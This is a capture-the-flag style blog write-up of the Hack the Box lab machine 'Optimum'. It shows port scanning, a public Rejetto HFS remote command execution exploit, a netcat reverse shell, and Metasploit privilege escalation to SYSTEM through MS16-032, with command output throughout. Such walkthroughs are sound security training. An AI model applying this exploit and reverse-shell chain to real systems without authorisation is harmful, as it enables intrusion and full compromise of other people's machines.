---
layout: post
title: Hack the Box - Optimum
date: 2020-05-04 23:23:22 +0100
description: Optimum is a beginner-level machine which mainly focuses on enumeration of services with known exploits. Both exploits are easy to obtain and have associated Metasploit modules, making this machine fairly simple to complete.
img: optimum.png
fig-caption: Optimum
categories: HackTheBox
tags: [Easy, Windows, Retired, CVE]
---
## Overview
Optimum is a beginner-level machine which mainly focuses on enumeration of services with known exploits. Both exploits are easy to obtain and have associated Metasploit modules, making this machine fairly simple to complete.
## Enumeration
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/optimum]
└─$ sudo nmap -p- -T4  10.129.57.165                                                                
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 23:50 GMT
Nmap scan report for 10.129.57.165
Host is up (0.017s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http
```
When I navigated to that port in a browser the landing page exposed the application and version number. Searching exploitdb for an exploit revealed a python script.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/optimum]
└─$ searchsploit hfs 2.3            
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                        | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                     | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution           | windows/webapps/34852.txt
----------------------------------------------------------------------------------- ---------------------------------

┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/optimum]
└─$ searchsploit -m 39161
  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
      URL: https://www.exploit-db.com/exploits/39161
     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators

Copied to: /home/calxus/hackthebox/optimum/39161.py
```
## Foothold
The only changes that were necessary to make this exploit run are adding the IP and port that our netcat listener are running on. We also need to host a file server that netcat is hosted in.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/optimum]
└─$ python 39161.py 10.129.57.165 80
```
Once the the exploit is run we should receive a shell.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/optimum]
└─$ nc -nlvp 4499
listening on [any] 4499 ...
connect to [10.10.14.27] from (UNKNOWN) [10.129.57.165] 49166
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop> whoami
 whoami
optimum\kostas
```
## Privilege Escalation
In order to get system on this machine I had to upload a metasploit binary and send back a meterpreter shell. When I did this I then ran the local_exploit_suggester and found it could be vulnerable to MS16-032. When I ran this exploit I got a system shell.
```
msf6 post(multi/recon/local_exploit_suggester) > exploit

[*] 10.129.57.165 - Collecting local exploits for x86/windows...
[*] 10.129.57.165 - 37 exploit checks are being tried...
[+] 10.129.57.165 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.129.57.165 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[*] Post module execution completed

msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > exploit

[*] Started reverse TCP handler on 10.10.14.27:4444 
[+] Compressed size: 1016
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
...
[+] Executed on target machine.
[*] Sending stage (175174 bytes) to 10.129.57.165
[*] Meterpreter session 2 opened (10.10.14.27:4444 -> 10.129.57.165:49184) at 2021-03-15 00:42:00 +0000
[+] Deleted C:\Users\kostas\AppData\Local\Temp\LljWcYKZFA.ps1

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```